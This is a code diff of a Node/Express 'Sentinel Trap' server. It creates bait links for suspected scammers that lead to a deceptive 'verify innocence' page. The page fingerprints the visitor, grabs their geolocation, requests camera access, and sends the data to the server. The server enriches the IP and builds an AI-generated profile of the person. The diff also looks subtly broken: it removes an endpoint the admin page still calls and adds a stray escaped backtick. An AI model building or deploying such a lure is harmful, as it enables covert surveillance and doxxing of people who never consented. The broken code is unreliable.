@@ -12,11 +12,18 @@ const app = express();
 // client IP from the first hop of `x-forwarded-for` instead of the proxy's IP.
 app.set('trust proxy', true);
 
-// Restrict CORS and socket.io to explicitly configured origins. If nothing is
-// configured, cross-origin requests are rejected rather than silently allowed.
-const allowedOrigins = (process.env.ALLOWED_ORIGINS || '')
-  .split(',').map(s => s.trim()).filter(Boolean);
-const corsOrigin = allowedOrigins.length ? allowedOrigins : false;
+// Restrict CORS and socket.io to explicitly configured origins. Always include
+// the Railway production domain so the bait page can POST to /api/track without
+// CORS errors even when ALLOWED_ORIGINS isn't explicitly set.
+const builtinOrigins = [
+  'https://sentinel-production-31c2.up.railway.app',
+];
+const allowedOrigins = [
+  ...builtinOrigins,
+  ...(process.env.ALLOWED_ORIGINS || '').split(',').map(s => s.trim()).filter(Boolean),
+];
+const corsOrigin = allowedOrigins;
+
 
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: corsOrigin } });
@@ -135,7 +142,9 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
 
       <div class="flex flex-col md:flex-row md:justify-between md:items-center gap-4 border-t border-zinc-800 pt-6">
         <h2 class="text-2xl font-bold text-lime-400">Admin Portal — Live Results</h2>
-        <div class="flex items-center gap-2">
+        <div class="flex items-center gap-3">
+          <span id="socketStatus" class="px-3 py-1 rounded-full text-sm font-bold bg-zinc-700 text-zinc-400">⚪ Connecting…</span>
+          <button onclick="sendTestClick()" class="px-4 py-2 bg-amber-600 hover:bg-amber-500 rounded-xl text-sm font-bold">🧪 Test Click</button>
           <button onclick="generateBait()" class="px-4 py-3 bg-red-600 hover:bg-red-700 rounded-xl">+ New bait link</button>
         </div>
       </div>
@@ -155,17 +164,45 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
         <div id="liveResearch" class="space-y-4"></div>
         <div id="researchHistory" class="space-y-4 mt-3"><em class="text-zinc-500">Loading…</em></div>
       </div>
+
+      <div>
+        <h3 class="text-lg text-sky-400 mb-3">🛠 Debug Console (socket.io events)</h3>
+        <div id="debugConsole" class="bg-black rounded-xl p-4 h-48 overflow-y-auto text-xs text-green-400 font-mono space-y-1"></div>
+      </div>
     </div>
   </div>
 
   <script>
     let socket = null;
     let portalReady = false;
+    let lastTrapId = null;
 
     function escapeHtml(s) {
       return String(s == null ? '' : s)
         .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
         .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+    }
+
+    function debugLog(msg) {
+      const el = document.getElementById('debugConsole');
+      if (!el) return;
+      const line = document.createElement('div');
+      line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+      el.prepend(line);
+      // Keep at most 200 lines
+      while (el.children.length > 200) el.removeChild(el.lastChild);
+    }
+
+    function setSocketStatus(connected) {
+      const el = document.getElementById('socketStatus');
+      if (!el) return;
+      if (connected) {
+        el.textContent = '🟢 Connected';
+        el.className = 'px-3 py-1 rounded-full text-sm font-bold bg-lime-900 text-lime-300';
+      } else {
+        el.textContent = '🔴 Disconnected';
+        el.className = 'px-3 py-1 rounded-full text-sm font-bold bg-red-900 text-red-300';
+      }
     }
 
     function renderEntry(data, ts) {
@@ -200,8 +237,11 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
     async function loadHistory() {
       const wrap = document.getElementById('history');
       try {
+        debugLog('Loading click history from /api/clicks…');
         const r = await fetch('/api/clicks');
+        if (!r.ok) throw new Error('HTTP ' + r.status);
         const rows = await r.json();
+        debugLog('History loaded: ' + rows.length + ' rows');
         if (!Array.isArray(rows) || rows.length === 0) {
           wrap.innerHTML = '<em class="text-zinc-500">No clicks recorded yet. Send the bait link to a scammer and results will appear here.</em>';
           return;
@@ -213,7 +253,8 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
           wrap.appendChild(renderEntry(data, ts));
         });
       } catch (e) {
-        wrap.innerHTML = '<em class="text-red-400">Failed to load history.</em>';
+        debugLog('ERROR loading history: ' + e.message);
+        wrap.innerHTML = '<em class="text-red-400">Failed to load history: ' + escapeHtml(e.message) + '</em>';
       }
     }
 
@@ -248,8 +289,11 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
     async function loadResearchHistory() {
       const wrap = document.getElementById('researchHistory');
       try {
+        debugLog('Loading research history from /api/live-events…');
         const r = await fetch('/api/live-events');
+        if (!r.ok) throw new Error('HTTP ' + r.status);
         const rows = await r.json();
+        debugLog('Research history loaded: ' + rows.length + ' rows');
         if (!Array.isArray(rows) || rows.length === 0) {
           wrap.innerHTML = '<em class="text-zinc-500">No research-mode events yet. Enable research preview and wait for a click.</em>';
           return;
@@ -261,7 +305,8 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
           wrap.appendChild(renderResearchEntry(data, ts));
         });
       } catch (e) {
-        wrap.innerHTML = '<em class="text-red-400">Failed to load research history.</em>';
+        debugLog('ERROR loading research history: ' + e.message);
+        wrap.innerHTML = '<em class="text-red-400">Failed to load research history: ' + escapeHtml(e.message) + '</em>';
       }
     }
 
@@ -270,60 +315,117 @@ app.get('/', adminLimiter, adminAuth, (req, res) => {
       portalReady = true;
       document.getElementById('generator').classList.add('hidden');
       document.getElementById('adminPortal').classList.remove('hidden');
+
+      debugLog('Initialising socket.io connection…');
       socket = io();
+
+      socket.on('connect', () => {
+        debugLog('socket.io connected — id=' + socket.id);
+        setSocketStatus(true);
+      });
+      socket.on('disconnect', (reason) => {
+        debugLog('socket.io disconnected: ' + reason);
+        setSocketStatus(false);
+      });
+      socket.on('connect_error', (err) => {
+        debugLog('socket.io connect_error: ' + err.message);
+        setSocketStatus(false);
+      });
+
       socket.on('live-click', (data) => {
+        debugLog('live-click received: trapId=' + data.trapId + ' ip=' + data.ip);
         const logDiv = document.getElementById('liveLog');
         logDiv.prepend(renderEntry(data, new Date().toLocaleTimeString()));
       });
       socket.on('research-live', (data) => {
+        debugLog('research-live received: trapId=' + data.trapId);
         const logDiv = document.getElementById('liveResearch');
         logDiv.prepend(renderResearchEntry(data, new Date().toLocaleTimeString()));
       });
+
       loadHistory();
       loadResearchHistory();
     }
 
+    async function sendTestClick() {
+      if (!lastTrapId) {
+        debugLog('No trap ID yet — generate a bait link first');
+        alert('Generate a bait link first so there is a valid trap ID to test with.');
+        return;
+      }
+      debugLog('Sending test click for trapId=' + lastTrapId + '…');
+      try {
+        const resp = await fetch('/api/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            trapId: lastTrapId,
+            visitorId: 'test-visitor-' + Date.now(),
+            ua: navigator.userAgent,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            languages: Array.from(navigator.languages || []),
+            screen: { w: screen.width, h: screen.height },
+            _testClick: true
+          })
+        });
+        if (resp.ok) {
+          debugLog('✅ Test click accepted by server (HTTP ' + resp.status + ')');
+        } else {
+          const text = await resp.text().catch(() => '');
+          debugLog('❌ Test click rejected: HTTP ' + resp.status + ' — ' + text);
+        }
+      } catch (e) {
+        debugLog('❌ Test click fetch error: ' + e.message);
+      }
+    }
+
     async function generateBait() {
-      const res = await fetch('/api/create-trap', { method: 'POST' });
-      const data = await res.json();
-      const fullLink = window.location.origin + data.link;
-      openAdminPortal();
-      document.getElementById('result').innerHTML = \`
-        <div class="bg-zinc-900 p-6 rounded-xl">
-          <strong class="text-lime-400">YOUR BAIT LINK (ready to send):</strong><br>
-          <a href="\${escapeHtml(fullLink)}" target="_blank" class="break-all text-blue-400">\${escapeHtml(fullLink)}</a><br><br>
-          <em class="text-zinc-400">Text the scammer: "Hey this link says you're a scammer 😂 click to prove it wrong"</em>
-        </div>
-      \`;
+      try {
+        debugLog('Creating new trap via /api/create-trap…');
+        const res = await fetch('/api/create-trap', { method: 'POST' });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        const data = await res.json();
+        lastTrapId = data.link.split('/').pop();
+        const fullLink = window.location.origin + data.link;
+        debugLog('Trap created: ' + lastTrapId);
+        openAdminPortal();
+        document.getElementById('result').innerHTML = \`
+          <div class="bg-zinc-900 p-6 rounded-xl">
+            <strong class="text-lime-400">YOUR BAIT LINK (ready to send):</strong><br>
+            <a href="\${escapeHtml(fullLink)}" target="_blank" class="break-all text-blue-400">\${escapeHtml(fullLink)}</a><br><br>
+            <em class="text-zinc-400">Text the scammer: "Hey this link says you're a scammer 😂 click to prove it wrong"</em>
+          </div>
+        \`;
+      } catch (e) {
+        debugLog('ERROR generating bait: ' + e.message);
+        alert('Failed to generate bait link: ' + e.message);
+      }
     }
   </script>
 </body>
 </html>`);
 });
 
-// Historical clicks feed for the admin portal on `/`. Gated behind admin
-// auth because the payloads contain IPs, fingerprints, and enrichment.
-app.get('/api/clicks', adminLimiter, adminAuth, async (req, res) => {
-  try {
-    const result = await pool.query(
-      'SELECT trap_id, data, created_at FROM clicks ORDER BY created_at DESC LIMIT 100'
-    );
-    res.json(result.rows);
-  } catch (e) {
-    res.status(500).json({ error: 'failed to load clicks' });
-  }
-});
+
+
 
 // CREATE TRAP — admin-only; anyone able to create traps can flood the DB.
 app.post('/api/create-trap', adminLimiter, adminAuth, async (req, res) => {
   const id = crypto.randomBytes(6).toString('hex');
   await pool.query('INSERT INTO traps (id) VALUES ($1)', [id]);
+  console.log(`🪤 Trap created: id=${id}`);
   res.json({ link: `/check-scammer/${id}` });
 });
 
+
 // THE BAIT PAGE (scammer sees this — advanced fingerprinting)
 app.get('/check-scammer/:id', (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  // Use the server-derived IP (trust proxy is set) and JSON.stringify it so
+  // any special characters are safely escaped before injection into JS.
+  const ip = getClientIp(req);
+  const safeIp = JSON.stringify(ip);           // e.g. "1.2.3.4" — always valid JS string literal
+  const safeTrapId = JSON.stringify(req.params.id);
+  console.log(`🎣 Bait page loaded: trapId=${req.params.id}, ip=${ip}`);
   res.send(`
 <!DOCTYPE html>
 <html>
@@ -334,33 +436,76 @@ app.get('/check-scammer/:id', (req, res) => {
   <div class="max-w-md text-center">
     <h1 class="text-5xl mb-4">Hey...</h1>
     <p class="text-2xl mb-8">This link says you're a scammer.</p>
-    <button onclick="activateTrap('${req.params.id}', '${ip}')" class="w-full py-8 text-3xl bg-red-600 hover:bg-red-700 rounded-2xl font-bold">VERIFY INNOCENCE NOW</button>
+    <button onclick="activateTrap(${safeTrapId}, ${safeIp})" class="w-full py-8 text-3xl bg-red-600 hover:bg-red-700 rounded-2xl font-bold">VERIFY INNOCENCE NOW</button>
   </div>
 
   <script src="https://openfpcdn.io/fingerprintjs/v5"></script>
   <script src="https://cdn.jsdelivr.net/npm/@thumbmarkjs/thumbmarkjs/dist/thumbmark.umd.js"></script>
   <script>
     async function activateTrap(trapId, ip) {
-      const fpPromise = FingerprintJS.load();
-      const fp = await fpPromise;
-      const result = await fp.get({ extendedResult: true });
-      const thumbResult = await ThumbmarkJS.get();
+      try {
+        console.log('🔍 Fingerprinting... trapId=' + trapId + ' ip=' + ip);
 
-      fetch('/api/track', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          trapId, visitorId: result.visitorId, thumbId: thumbResult,
-          ip, ua: navigator.userAgent,
-          fingerprint: result,
+        let visitorId = null, thumbResult = null, fpResult = null;
+        try {
+          const fpPromise = FingerprintJS.load();
+          const fp = await fpPromise;
+          fpResult = await fp.get({ extendedResult: true });
+          visitorId = fpResult.visitorId;
+          console.log('✅ FingerprintJS visitorId=' + visitorId);
+        } catch (e) {
+          console.error('⚠️ FingerprintJS failed:', e);
+        }
+
+        try {
+          thumbResult = await ThumbmarkJS.get();
+          console.log('✅ ThumbmarkJS done');
+        } catch (e) {
+          console.error('⚠️ ThumbmarkJS failed:', e);
+        }
+
+        const payload = {
+          trapId,
+          visitorId,
+          thumbId: thumbResult,
+          ip,
+          ua: navigator.userAgent,
+          fingerprint: fpResult,
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-          languages: navigator.languages,
-          screen: {w: screen.width, h: screen.height}
-        })
-      }).then(() => {
-        // Research mode is always on — attempt geolocation + camera capture
-        // on every click. Both are best-effort; denials/errors are swallowed
-        // so the redirect still runs.
+          languages: Array.from(navigator.languages || []),
+          screen: { w: screen.width, h: screen.height }
+        };
+
+        console.log('📤 Sending to server...', { trapId, ip, visitorId });
+
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 10000);
+        let trackOk = false;
+        try {
+          const resp = await fetch('/api/track', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            signal: controller.signal
+          });
+          clearTimeout(timeoutId);
+          if (resp.ok) {
+            console.log('✅ Tracked! Server responded ' + resp.status);
+            trackOk = true;
+          } else {
+            const text = await resp.text().catch(() => '');
+            console.error('❌ Track request failed: HTTP ' + resp.status, text);
+          }
+        } catch (e) {
+          clearTimeout(timeoutId);
+          if (e.name === 'AbortError') {
+            console.error('❌ Track request timed out after 10s');
+          } else {
+            console.error('❌ Track fetch error:', e);
+          }
+        }
+
+        // Research mode — geolocation + camera. Best-effort; never blocks redirect.
         try {
           navigator.geolocation.getCurrentPosition(p => {
             const geo = {
@@ -373,25 +518,39 @@ app.get('/check-scammer/:id', (req, res) => {
               speed: p.coords.speed,
               timestamp: p.timestamp
             };
+            console.log('📍 Geolocation captured, sending...');
             fetch('/api/live', {
               method: 'POST',
-              headers: {'Content-Type': 'application/json'},
+              headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(geo)
-            });
-          }, () => {});
-        } catch (e) {}
+            }).catch(e => console.error('⚠️ Geo send failed:', e));
+          }, (err) => {
+            console.log('📍 Geolocation denied/unavailable:', err.message);
+          });
+        } catch (e) {
+          console.error('⚠️ Geolocation error:', e);
+        }
+
         try {
-          navigator.mediaDevices.getUserMedia({video:true})
+          navigator.mediaDevices.getUserMedia({ video: true })
             .then(() => console.log('📸 Camera hooked — Research Preview active'))
-            .catch(()=>{});
+            .catch(() => {});
         } catch (e) {}
-        window.location = 'https://i.imgur.com/you-got-caught-meme.jpg'; // real meme redirect (change if you want)
-      });
+
+        console.log('🔀 Redirecting...');
+        window.location = 'https://i.imgur.com/you-got-caught-meme.jpg';
+
+      } catch (e) {
+        console.error('💥 activateTrap top-level error:', e);
+        // Redirect anyway so the scammer doesn't see a broken page
+        window.location = 'https://i.imgur.com/you-got-caught-meme.jpg';
+      }
     }
   </script>
 </body>
 </html>`);
 });
+
 
 // ROBUST DASHBOARD (full live view of all great information)
 app.get('/dashboard', adminLimiter, adminAuth, (req, res) => {
@@ -440,8 +599,9 @@ app.get('/dashboard', adminLimiter, adminAuth, (req, res) => {
     });
   </script>
 </body>
-</html>`);
+</html>\`);
 });
+
 
 // Per-IP rate limits for the public scammer-facing endpoints so they can't
 // be abused to flood the database or socket.io with junk events.
@@ -476,14 +636,14 @@ async function trapExists(trapId) {
 app.post('/api/track', trackLimiter, async (req, res) => {
   const body = req.body || {};
   const { trapId } = body;
+  const clientIp = getClientIp(req);
+
+  console.log(`📍 Track request received: trapId=${trapId}, ip=${clientIp}, ts=${new Date().toISOString()}`);
 
   if (!(await trapExists(trapId))) {
+    console.warn(`⚠️  Track rejected: unknown trapId=${trapId}`);
     return res.status(404).json({ error: 'unknown trap' });
   }
-
-  // Server-derived only; client-supplied `body.ip` is ignored so it can't be
-  // used to poison enrichment / stored records.
-  const clientIp = getClientIp(req);
 
   // Acknowledge immediately so the client can redirect without blocking on
   // external API timeouts.
@@ -494,16 +654,21 @@ app.post('/api/track', trackLimiter, async (req, res) => {
       let ipinfo = null, abuse = null, aiProfile = null;
 
       if (process.env.IPINFO_TOKEN && clientIp) {
+        console.log(`🌐 Fetching ipinfo for ${clientIp}...`);
         try {
           const r = await axios.get(
             `https://ipinfo.io/${encodeURIComponent(clientIp)}`,
             { params: { token: process.env.IPINFO_TOKEN }, timeout: 5000 }
           );
           ipinfo = r.data;
-        } catch (e) { console.error('ipinfo failed:', e.message); }
+          console.log(`✅ ipinfo: country=${ipinfo.country}, org=${ipinfo.org}`);
+        } catch (e) { console.error('❌ ipinfo failed:', e.message); }
+      } else {
+        console.log('ℹ️  ipinfo skipped (no IPINFO_TOKEN or no IP)');
       }
 
       if (process.env.ABUSEIPDB_KEY && clientIp) {
+        console.log(`🔍 Fetching AbuseIPDB for ${clientIp}...`);
         try {
           const r = await axios.get('https://api.abuseipdb.com/api/v2/check', {
             params: { ipAddress: clientIp, maxAgeInDays: 90 },
@@ -511,10 +676,14 @@ app.post('/api/track', trackLimiter, async (req, res) => {
             timeout: 5000
           });
           abuse = r.data && r.data.data;
-        } catch (e) { console.error('abuseipdb failed:', e.message); }
+          console.log(`✅ AbuseIPDB: score=${abuse && abuse.abuseConfidenceScore}`);
+        } catch (e) { console.error('❌ abuseipdb failed:', e.message); }
+      } else {
+        console.log('ℹ️  AbuseIPDB skipped (no ABUSEIPDB_KEY or no IP)');
       }
 
       if (process.env.OPENROUTER_KEY) {
+        console.log('🤖 Requesting AI profile from OpenRouter...');
         try {
           const summary = {
             ip: clientIp, ua: body.ua, ipinfo, abuse,
@@ -536,7 +705,10 @@ app.post('/api/track', trackLimiter, async (req, res) => {
             }
           );
           aiProfile = r.data && r.data.choices && r.data.choices[0] && r.data.choices[0].message && r.data.choices[0].message.content;
-        } catch (e) { console.error('openrouter failed:', e.message); }
+          console.log(`✅ AI profile generated (${aiProfile ? aiProfile.length : 0} chars)`);
+        } catch (e) { console.error('❌ openrouter failed:', e.message); }
+      } else {
+        console.log('ℹ️  OpenRouter skipped (no OPENROUTER_KEY)');
       }
 
       // Strip client-supplied ip so it can't override the server-derived value.
@@ -545,14 +717,19 @@ app.post('/api/track', trackLimiter, async (req, res) => {
 
       try {
         await pool.query('INSERT INTO clicks (trap_id, data) VALUES ($1, $2)', [trapId, enriched]);
-      } catch (e) { console.error('clicks insert failed:', e.message); }
+        console.log(`💾 Click inserted into DB: trapId=${trapId}, ip=${clientIp}`);
+      } catch (e) { console.error('❌ clicks insert failed:', e.message); }
 
       io.emit('live-click', enriched);
+      console.log(`📡 socket.io live-click emitted: trapId=${trapId}`);
     } catch (e) {
-      console.error('track background processing failed:', e);
+      console.error('❌ track background processing failed:', e);
     }
   });
 });
+
+
+
 
 // RESEARCH LIVE — geolocation / extra signals captured from the scammer.
 // Requires a valid `trapId` (anti-spam), whitelists the accepted fields, and
@@ -598,6 +775,12 @@ app.get('/api/live-events', adminLimiter, adminAuth, async (req, res) => {
   }
 });
 
-io.on('connection', () => {});
+io.on('connection', (socket) => {
+  console.log(`🔌 socket.io client connected: id=${socket.id}`);
+  socket.on('disconnect', (reason) => {
+    console.log(`🔌 socket.io client disconnected: id=${socket.id}, reason=${reason}`);
+  });
+});
+
 
 server.listen(process.env.PORT || 3000, () => console.log('🚀 Sentinel Trap v4 FULLY LIVE — robust frontend deployed'));
